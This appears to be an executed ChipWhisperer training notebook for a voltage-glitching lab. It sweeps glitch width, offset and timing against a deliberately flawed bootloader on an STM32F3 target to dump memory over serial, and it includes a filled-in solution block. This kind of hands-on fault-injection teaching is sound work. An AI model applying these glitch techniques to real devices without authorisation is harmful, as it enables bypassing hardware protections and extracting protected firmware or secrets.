# Part 2, Topic 3: Voltage Glitching to Dump Memory (MAIN)

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *In the previous labs, we learned how voltage glitching can be used for a similar function as clock glitching. We also learned about how it has fewer limitations, but can be less reliable for certain target setups. It also changes a great deal based on the properties of the glitch circuit itself - even changing a wire can have a huge effect.*

*In this lab, we'll use what we learned in the last lab to again attack the vulnerable serial printing of the bootloader*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching
* Understanding how compiler optimizations can cause devices to behave in strange ways

## The Situation

You should already know the situation from your previous attempts at glitching this bootloader (as well as what the flaw is). No need to do big long searches for parameters to try glitching at the beginning of the loop, just use values that worked well for the previous tutorial.

Be careful that you don't accidentally put the spot we're trying to glitch outside of `glitch_spots` - if you used a repeat > 1, the actual spot being glitched might be at the end or in the middle of the repeat!

Like with the clock glitching version of this lab, we'll be using SimpleSerial V2 to speed up glitching

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CW308_STM32F3'
SS_VER='SS_VER_2_1'

In [2]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/bootloader-glitch
make clean PLATFORM=$1 CRYPTO_TARGET=NONE -j SS_VER=$2

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
rm -f -- bootloader-CW308_CC2538.hex bootloader-CW301_AVR.hex bootloader-CW303.hex bootloader-CW304.hex bootloader-CW308_MEGARF.hex bootloader-CW308_SAM4L.hex bootloader-CW308_STM32F0.hex bootloader-CW308_STM32F1.hex bootloader-CW308_STM32F2.hex bootloader-CW308_STM32F3.hex bootloader-CW308_STM32F4.hex bootloader-CW308_K24F.hex bootloader-CW308_NRF52.hex bootloader-CW308_AURIX.hex bootloader-CW308_SAML11.hex bootloader-CW308_EFM32TG11B.hex bootloader-CWLITEARM.hex bootloader-CWLITEXMEGA.hex bootloader-CWNANO.hex bootloader-CW308_K82F.hex bootloader-CW308_PSOC62.hex bootloader-CW308_IMXRT1062.hex bootloader-CW308_FE310.hex bootloader-CW308_EFR32MG21A.hex bootloader-CW308_EFM32GG11.hex bootloader-CW308_STM32L5.hex bootloader-CW308_NEORV32.hex bootloader-CW308_SAM4S.hex bootloader-CW305_IBEX.hex
rm -rf .dep
.
rm -f -- bootloader-CW308_CC2538.eep bootloader-CW301_AVR.eep bootloader-CW303.eep bootloader-CW304.eep bootloader-CW308_MEGARF.eep 

/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-closer.o): in function `_close_r':
/build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/closer.c:47:(.text+0xc): warning: _close is not implemented and will always fail
/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-lseekr.o): in function `_lseek_r':
/build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/lseekr.c:49:(.text+0x14): warning: _lseek is not implemented and will always fail


/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-closer.o): note: the message above does not take linker garbage collection into account
/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-lseekr.o): note: the message above does not take linker garbage collection into account


/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-readr.o): in function `_read_r':
/build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/readr.c:49:(.text+0x14): warning: _read is not implemented and will always fail


/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-readr.o): note: the message above does not take linker garbage collection into account


/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-writer.o): in function `_write_r':
/build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/writer.c:49:(.text+0x14): warning: _write is not implemented and will always fail


/usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-writer.o): note: the message above does not take linker garbage collection into account
-e Done!
.
.
.
.
.
Creating load file for Flash: bootloader-CW308_STM32F3.hex
Creating load file for Flash: bootloader-CW308_STM32F3.bin
Creating load file for EEPROM: bootloader-CW308_STM32F3.eep
arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature bootloader-CW308_STM32F3.elf bootloader-CW308_STM32F3.hex
arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature bootloader-CW308_STM32F3.elf bootloader-CW308_STM32F3.bin
Creating Extended Listing: bootloader-CW308_STM32F3.lss
Creating Symbol Table: bootloader-CW308_STM32F3.sym
arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
--change-section-lma .eeprom=0 --no-change-warnings -O ihex bootloader-CW308_STM32F3.elf bootloader-CW308

In [3]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

(ChipWhisperer NAEUSB WARNING|File naeusb.py:826) Your firmware (0.64.0) is outdated - latest is 0.65.0 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information


INFO: Found ChipWhisperer😍
scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 30                       
scope.gain.db                            changed from 5.5                       to 24.8359375               
scope.adc.basic_mode                     changed from low                       to rising_edge              
scope.adc.samples                        changed from 24400                     to 5000                     
scope.adc.trig_count                     changed from 12383033                  to 35446184                 
scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                
scope.clock.adc_freq                     changed from 0                         to 29538471                 
scope.clock.adc_rate                     changed from 0.0                       to 29538471.0        

In [4]:
fw_path = "../../../firmware/mcu/bootloader-glitch/bootloader-{}.hex".format(PLATFORM)

In [5]:
cw.program_target(scope, prog, fw_path)

Detected unknown STM32F ID: 0x446
Extended erase (0x44), this can take ten seconds or more
Attempting to program 4551 bytes at 0x8000000
STM32F Programming flash...
STM32F Reading flash...
Verified flash OK, 4551 bytes


In [6]:
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
scope.clock.adc_src = "clkgen_x1"
reboot_flush()
scope.adc.samples = 24000

Again, we're going to use a higher frequency on non-Husky ChipWhisperers. We'll also use the trigger length to get our `ext_offset` range:

In [8]:
scope.clock.adc_src = "clkgen_x1"
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
    
scope.clock.adc_src = "clkgen_x1"
reboot_flush()
scope.adc.samples = 24000

if PLATFORM == "CWLITEXMEGA":
    scope.clock.clkgen_freq = 32E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*32/7.37
    else:
        target.baud = 38400*32/7.37
elif (PLATFORM == "CWLITEARM"):
    scope.clock.clkgen_freq = 24E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*24/7.37
    else:
        target.baud = 38400*24/7.37
        
elif (PLATFORM == "CW308_STM32F3"):
    scope.clock.clkgen_freq = 24E6
    target.baud = int(230400*24/7.37)

reboot_flush()
scope.arm()
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
        
trig_count = scope.adc.trig_count

print(trig_count)
print(scope.clock)
print(target.baud)
cw.plot(scope.get_last_trace())

4188
adc_src       = clkgen_x1
adc_phase     = 0
adc_freq      = 24000000
adc_rate      = 24000000.0
adc_locked    = True
freq_ctr      = 0
freq_ctr_src  = extclk
clkgen_src    = system
extclk_freq   = 10000000
clkgen_mul    = 2
clkgen_div    = 8
clkgen_freq   = 24000000.0
clkgen_locked = True

750284


:Curve   [x]   (y)

Like with the clock version of this lab, you'll want to inspect the power trace and glitch near the beginning and end of the loop.

In [9]:
glitch_spots = [i for i in range(1)]
# ###################
# Add your code here
# ###################
#raise NotImplementedError("Add your code here, and delete this.")

# ###################
# START SOLUTION
# ###################
glitch_spots = list(range(trig_count - 2000, trig_count, 1))
if SS_VER == "SS_VER_2_1": #here
    # glitch_spots = list(range(0, trig_count, 1))
    glitch_spots = list(range(3200,3800, 1))
elif PLATFORM == "CW308_SAM4S":
    glitch_spots = list(range(trig_count - 2300, trig_count-1800, 1))
# elif PLATFORM == "CW308_STM32F3": # refer to init if condition
#     glitch_spots = list(range(trig_count - 2300, trig_count-1800, 1))
elif PLATFORM == "CWLITEXMEGA":
    glitch_spots = list(range(9500, 9650, 1))
# ###################
# END SOLUTION
# ###################

In [10]:
if scope._is_husky:
    scope.vglitch_setup('hp', default_setup=False)
else:
    scope.vglitch_setup('both', default_setup=False) # use both transistors

def my_print(text):
    for ch in text:
        if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
            print(ch, end='')
        else:
            print("0x{:02X}".format(ord(ch)), end='')
        print("", end='')

In [11]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

FloatSlider(value=0.0, continuous_update=False, description='tries setting:', disabled=True, max=10.0, readout…

In [12]:
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_index="width", y_index="ext_offset")

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,ext_offset]
      .Points.II :Points   [width,ext_offset]

In [13]:
if scope._is_husky:
    gc.set_range("width", 1850, 1901)
    gc.set_range("offset", 2000, 2300)
    gc.set_global_step([50])
else:
    gc.set_global_step(0.4)
    if PLATFORM == "CWLITEXMEGA":
        gc.set_range("width", 46, 49.8)
        gc.set_range("offset", -46, -49.8)
        scope.glitch.repeat = 11
    elif PLATFORM == "CW308_STM32F4":
        gc.set_range("width", 0.4, 10)
        gc.set_range("offset", 40, 49.8)
        scope.glitch.repeat = 5
    elif PLATFORM == "CW308_STM32F3":
        gc.set_range("width", 0.4, 10)
        gc.set_range("offset", 40, 49.8)
        scope.glitch.repeat = 5
    elif PLATFORM == "CWLITEARM":
        gc.set_range("width", 34, 36)
        gc.set_range("offset", -40, 10)
        scope.glitch.repeat = 7

gc.set_range("tries", 1, 1) # change this if you want to glitch each spot multiple times
gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
gc.set_step("tries", 1)

In [ ]:
#disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)
scope.adc.timeout = 0.2

broken = False
for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    if broken:
        break
    scope.glitch.ext_offset = glitch_setting[2]
    if scope.adc.state:
        print("Timeout, trigger still high!")
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        time.sleep(0.05)
        output = target.read(timeout=2)
        if "767" in output:
            print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
            gc.add("success")
            broken = False #remove to get only 1 result
            for __ in range(500):
                num_char = target.in_waiting()
                if num_char:
                    my_print(output)
                    output = target.read(timeout=50)
            time.sleep(1)
            #break #remove if you want to get only one result
        else:
            print("normal")
            gc.add("normal")
                
#reenable logging
cw.set_all_log_levels(cw.logging.WARNING)

normal


In [ ]:
scope.dis()
target.dis()

In [ ]:
assert broken == True